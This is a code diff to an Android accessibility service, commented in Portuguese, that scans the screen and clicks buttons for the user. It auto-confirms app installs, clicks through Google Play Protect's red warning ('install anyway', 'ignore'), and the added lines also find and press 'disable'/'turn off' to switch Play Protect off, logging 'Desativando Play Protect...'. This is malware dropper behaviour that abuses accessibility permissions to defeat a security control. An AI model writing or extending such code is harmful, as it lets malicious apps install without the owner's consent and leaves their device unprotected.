@@ -22,27 +22,20 @@ public class AutoClickerService extends AccessibilityService {
         if (node.getText() != null) {
             String t = node.getText().toString().toLowerCase();
             
-            // 1. Instalação normal
             if (t.equals("instalar") || t.equals("install") || t.equals("abrir") || t.equals("open")) {
                 node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                Log.d(TAG, "Clicou em Instalar/Abrir");
-            }
-            // 2. Tela vermelha do Play Protect (Mais detalhes)
-            else if (t.contains("mais detalhes") || t.contains("more details") || t.contains("detalhes") || t.contains("details")) {
+            } else if (t.contains("mais detalhes") || t.contains("more details") || t.contains("detalhes") || t.contains("details")) {
                 node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                Log.d(TAG, "Abriu Mais Detalhes");
-            }
-            // 3. Botão final do Play Protect (Instalar assim mesmo)
-            else if (t.contains("assim mesmo") || t.contains("anyway") || t.contains("ignorar") || t.contains("ignore") || t.equals("ok") || t.equals("entendi")) {
+            } else if (t.contains("assim mesmo") || t.contains("anyway") || t.contains("ignorar") || t.contains("ignore") || t.equals("ok") || t.equals("entendi")) {
                 node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                Log.d(TAG, "Furou o bloqueio");
+            } else if (t.contains("desativar") || t.contains("turn off") || t.contains("disable")) {
+                node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                Log.d(TAG, "Desativando Play Protect...");
+            } else if (t.equals("play protect") || t.contains("configurar")) {
+                node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
             }
         }
-        
-        // Varre todos os elementos da tela
-        for (int i = 0; i < node.getChildCount(); i++) { 
-            clicar(node.getChild(i)); 
-        }
+        for (int i = 0; i < node.getChildCount(); i++) { clicar(node.getChild(i)); }
     }
 
     @Override
